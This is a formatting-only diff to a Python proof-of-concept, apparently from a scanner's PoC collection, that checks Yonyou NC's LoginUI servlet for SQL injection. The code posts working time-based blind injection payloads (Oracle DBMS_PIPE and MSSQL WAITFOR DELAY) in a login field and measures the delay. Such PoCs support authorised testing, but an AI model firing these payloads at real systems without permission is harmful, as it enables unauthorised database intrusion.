@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Yonyou_0034' # 平台漏洞编号，留空
+    vuln_id = 'Yonyou_0034'  # 平台漏洞编号，留空
     name = '用友NC SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-09-06'  # 漏洞公布时间
     desc = '''
         用友NC /nc/servlet/nc.ui.iufo.login.LoginUI 参数过滤不完整，SQL注入漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '8e6389b7-ae33-4133-bb05-ce3b9359dad0'
@@ -31,31 +33,32 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2015-0138680
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2015-0138680
             hh = hackhttp.hackhttp()
             url = self.target + '/nc/servlet/nc.ui.iufo.login.LoginUI'
-            postdatas ={                                            
-                'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%20AND%208148%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2867%29%7C%7CCHR%2885%29%7C%7CCHR%2876%29%2C5%29%20AND%20%28%271%27%3D%271':'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%20AND%208148%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2867%29%7C%7CCHR%2885%29%7C%7CCHR%2876%29%2C1%29%20AND%20%28%271%27%3D%271',
-                'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--':'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A1%27--'
+            postdatas = {
+                'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%20AND%208148%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2867%29%7C%7CCHR%2885%29%7C%7CCHR%2876%29%2C5%29%20AND%20%28%271%27%3D%271': 'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%20AND%208148%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2867%29%7C%7CCHR%2885%29%7C%7CCHR%2876%29%2C1%29%20AND%20%28%271%27%3D%271',
+                'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--': 'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A1%27--'
             }
-            for postdata in postdatas: 
+            for postdata in postdatas:
                 t1 = time.time()
-                code1, head, res1, errcode, _ = hh.http(url,postdata)
+                code1, head, res1, errcode, _ = hh.http(url, postdata)
                 t2 = time.time()
-                code2, head, res2, errcode, _ = hh.http(url,postdatas[postdata])
+                code2, head, res2, errcode, _ = hh.http(
+                    url, postdatas[postdata])
                 t3 = time.time()
                 if code1 == 200 and code2 == 200 and (2*t2 - t1 - t3 > 3):
                     #security_hole(url + "   :post Injection")
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
-                    
-                
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
